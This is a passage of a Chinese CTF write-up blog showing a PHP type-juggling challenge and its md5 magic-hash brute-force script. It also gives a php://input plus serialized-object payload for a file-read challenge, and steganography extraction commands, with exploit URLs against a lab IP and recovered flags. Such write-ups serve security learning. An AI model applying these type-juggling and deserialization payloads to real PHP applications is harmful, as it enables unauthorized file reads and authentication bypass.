</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-50>50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-51>51</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-52><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-52>52</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-53><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-53>53</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-54><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-54>54</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-55><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-55>55</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-56><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-56>56</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> 
</span></span><span style=display:flex><span><span style=color:#a6e22e>show_source</span>(<span style=color:#66d9ef>__FILE__</span>); 
</span></span><span style=display:flex><span>$a<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; 
</span></span><span style=display:flex><span>$b<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; 
</span></span><span style=display:flex><span>$c<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; 
</span></span><span style=display:flex><span>$d<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; 
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;x1&#39;</span>])) <span style=color:#75715e>//$x1=0;=&gt;$a=1;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>{ 
</span></span><span style=display:flex><span>        $x1 <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;x1&#39;</span>]; 
</span></span><span style=display:flex><span>        $x1<span style=color:#f92672>==</span><span style=color:#e6db74>&#34;1&#34;</span><span style=color:#f92672>?</span><span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;ha?&#34;</span>)<span style=color:#f92672>:</span><span style=color:#66d9ef>NULL</span>; 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>switch</span> ($x1) 
</span></span><span style=display:flex><span>        { 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>0</span><span style=color:#f92672>:</span> 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> 
</span></span><span style=display:flex><span>                $a<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>; 
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>; 
</span></span><span style=display:flex><span>        } 
</span></span><span style=display:flex><span>} 
</span></span><span style=display:flex><span>$x2<span style=color:#f92672>=</span>(<span style=color:#66d9ef>array</span>)<span style=color:#a6e22e>json_decode</span>(<span style=color:#f92672>@</span>$_GET[<span style=color:#e6db74>&#39;x2&#39;</span>]); 
</span></span><span style=display:flex><span><span style=color:#75715e>//$x2=json_encode([&#39;x21&#39;=&gt;&#39;2018hello&#39;,&#39;x22&#39;=&gt;[[],0]]) ;
</span></span></span><span style=display:flex><span><span style=color:#75715e>//string(32) &#34;{&#34;x21&#34;:&#34;2018hello&#34;,&#34;x22&#34;:[[],0]}&#34;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>is_array</span>($x2)){ 
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>is_numeric</span>(<span style=color:#f92672>@</span>$x2[<span style=color:#e6db74>&#34;x21&#34;</span>])<span style=color:#f92672>?</span><span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;ha?&#34;</span>)<span style=color:#f92672>:</span><span style=color:#66d9ef>NULL</span>; 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#f92672>@</span>$x2[<span style=color:#e6db74>&#34;x21&#34;</span>]){ 
</span></span><span style=display:flex><span>        ($x2[<span style=color:#e6db74>&#34;x21&#34;</span>]<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>2017</span>)<span style=color:#f92672>?</span>$b<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span><span style=color:#66d9ef>NULL</span>; 
</span></span><span style=display:flex><span>    } 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>is_array</span>(<span style=color:#f92672>@</span>$x2[<span style=color:#e6db74>&#34;x22&#34;</span>])){ 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>count</span>($x2[<span style=color:#e6db74>&#34;x22&#34;</span>])<span style=color:#f92672>!==</span><span style=color:#ae81ff>2</span> <span style=color:#66d9ef>OR</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>is_array</span>($x2[<span style=color:#e6db74>&#34;x22&#34;</span>][<span style=color:#ae81ff>0</span>])) <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;ha?&#34;</span>); 
</span></span><span style=display:flex><span>        $p <span style=color:#f92672>=</span> <span style=color:#a6e22e>array_search</span>(<span style=color:#e6db74>&#34;XIPU&#34;</span>, $x2[<span style=color:#e6db74>&#34;x22&#34;</span>]); 
</span></span><span style=display:flex><span>        <span style=color:#75715e>//array_search — 在数组中搜索给定的值，如果成功则返回相应的键名 
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>//mixed array_search( mixed $needle, array $haystack[, bool $strict = false] )
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>//第三个参数决定在搜索时是否比较类型，默认不比较，也是这里能够绕过的原因。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>//var_dump(array_search(&#39;XIPU&#39;, array(&#34;0&#34;,&#34;1&#34;,0)));//int(2)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>//0==‘XIPU’为真，搜索到0值的下标为2
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        $p<span style=color:#f92672>===</span><span style=color:#66d9ef>false</span><span style=color:#f92672>?</span><span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;ha?&#34;</span>)<span style=color:#f92672>:</span><span style=color:#66d9ef>NULL</span>; 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>foreach</span>($x2[<span style=color:#e6db74>&#34;x22&#34;</span>] <span style=color:#66d9ef>as</span> $key<span style=color:#f92672>=&gt;</span>$val){ 
</span></span><span style=display:flex><span>            $val<span style=color:#f92672>===</span><span style=color:#e6db74>&#34;XIPU&#34;</span><span style=color:#f92672>?</span><span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;ha?&#34;</span>)<span style=color:#f92672>:</span><span style=color:#66d9ef>NULL</span>; 
</span></span><span style=display:flex><span>        } 
</span></span><span style=display:flex><span>        $c<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>; 
</span></span><span style=display:flex><span>} 
</span></span><span style=display:flex><span>} 
</span></span><span style=display:flex><span>$x3 <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;x3&#39;</span>]; 
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($x3 <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;15562&#39;</span>) { 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strstr</span>($x3, <span style=color:#e6db74>&#39;XIPU&#39;</span>)) { 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>substr</span>(<span style=color:#a6e22e>md5</span>($x3),<span style=color:#ae81ff>8</span>,<span style=color:#ae81ff>16</span>) <span style=color:#f92672>==</span> <span style=color:#a6e22e>substr</span>(<span style=color:#a6e22e>md5</span>(<span style=color:#e6db74>&#39;15562&#39;</span>),<span style=color:#ae81ff>8</span>,<span style=color:#ae81ff>16</span>)) { 
</span></span><span style=display:flex><span>            <span style=color:#75715e>//两个符合正则  /0e\d+/  的字符串弱相等。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#75715e>// 爆破见下方python代码
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            $d<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>; 
</span></span><span style=display:flex><span>        } 
</span></span><span style=display:flex><span>    } 
</span></span><span style=display:flex><span>} 
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($a <span style=color:#f92672>&amp;&amp;</span> $b <span style=color:#f92672>&amp;&amp;</span> $c <span style=color:#f92672>&amp;&amp;</span> $d){ 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#34;flag.php&#34;</span>; 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> $flag; 
</span></span><span style=display:flex><span>} 
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-22>22</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>brute</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> a <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0x20</span>, <span style=color:#ae81ff>0x7f</span>):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> b <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0x20</span>, <span style=color:#ae81ff>0x7f</span>):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0x20</span>, <span style=color:#ae81ff>0x7f</span>):
</span></span><span style=display:flex><span>                    x <span style=color:#f92672>=</span> chr(a) <span style=color:#f92672>+</span> chr(b) <span style=color:#f92672>+</span> chr(c)<span style=color:#f92672>+</span>s
</span></span><span style=display:flex><span>                    mm<span style=color:#f92672>=</span>md5(x<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;UTF-8&#39;</span>))<span style=color:#f92672>.</span>hexdigest()
</span></span><span style=display:flex><span>                    flag<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> mm[<span style=color:#ae81ff>10</span>:<span style=color:#ae81ff>24</span>]:
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>if</span> i <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> <span style=color:#e6db74>&#39;0123456789&#39;</span>:
</span></span><span style=display:flex><span>                            flag<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>                            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> flag <span style=color:#f92672>and</span> mm[<span style=color:#ae81ff>8</span>:<span style=color:#ae81ff>10</span>]<span style=color:#f92672>==</span><span style=color:#e6db74>&#39;0e&#39;</span>:
</span></span><span style=display:flex><span>                        print(x)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>brute()
</span></span><span style=display:flex><span><span style=color:#75715e># kN[XIPU</span>
</span></span><span style=display:flex><span><span style=color:#75715e># v=|XIPU</span>
</span></span><span style=display:flex><span><span style=color:#75715e># y&#39;wXIPU</span>
</span></span><span style=display:flex><span><span style=color:#75715e># }MOXIPU</span>
</span></span><span style=display:flex><span><span style=color:#75715e># ~VhXIPU</span>
</span></span><span style=display:flex><span><span style=color:#75715e>## http://192.168.200.200/web/bestlanguage/?x1=0&amp;x2={%22x21%22:%222018hello%22,%22x22%22:[[],0]}&amp;x3=~VhXIPU</span>
</span></span><span style=display:flex><span><span style=color:#75715e>## flag{510ea2879fa29d0d618b1f55350965c3}</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=the-user-is-admin>the user is admin<a hidden class=anchor aria-hidden=true href=#the-user-is-admin>#</a></h1><p>和 bugku 平台某个题目原理相似，因此没有保留源码。可以参考 <a href=https://findneo.github.io/180406BugkuWriteup/#welcome-to-bugkuctf>该题</a> ，不赘述。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-5>5</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>/</span><span style=color:#a6e22e>web</span><span style=color:#f92672>/</span><span style=color:#a6e22e>theuserisadmin</span><span style=color:#f92672>/?</span><span style=color:#a6e22e>file</span><span style=color:#f92672>=</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span><span style=color:#f92672>&amp;</span><span style=color:#a6e22e>user</span><span style=color:#f92672>=</span><span style=color:#a6e22e>php</span><span style=color:#f92672>://</span><span style=color:#a6e22e>input</span><span style=color:#f92672>&amp;</span><span style=color:#a6e22e>pass</span><span style=color:#f92672>=</span><span style=color:#a6e22e>O</span><span style=color:#f92672>:</span><span style=color:#ae81ff>4</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;Read&#34;</span><span style=color:#f92672>:</span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span>{<span style=color:#a6e22e>s</span><span style=color:#f92672>:</span><span style=color:#ae81ff>4</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;file&#34;</span>;<span style=color:#a6e22e>s</span><span style=color:#f92672>:</span><span style=color:#ae81ff>8</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;f1a9.php&#34;</span>;}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>post</span><span style=color:#f92672>:</span><span style=color:#a6e22e>the</span> <span style=color:#a6e22e>user</span> <span style=color:#a6e22e>is</span> <span style=color:#a6e22e>admin</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span><span style=color:#75715e>//flag{078d8dd8023d5716a11780adf344dfd2}
</span></span></span></code></pre></td></tr></table></div></div><h1 id=ccgs>ccgs<a hidden class=anchor aria-hidden=true href=#ccgs>#</a></h1><p><img loading=lazy src=9f7d91977ed05fcb0.png alt></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>binwalk <span style=color:#f92672>-</span>e sgcc<span style=color:#f92672>.</span>png
</span></span><span style=display:flex><span>cat secret<span style=color:#f92672>.</span>txt <span style=color:#f92672>|</span> base64 <span style=color:#f92672>-</span>d <span style=color:#f92672>|</span> base64 <span style=color:#f92672>-</span>d <span style=color:#f92672>&gt;</span> final<span style=color:#f92672>.</span>png
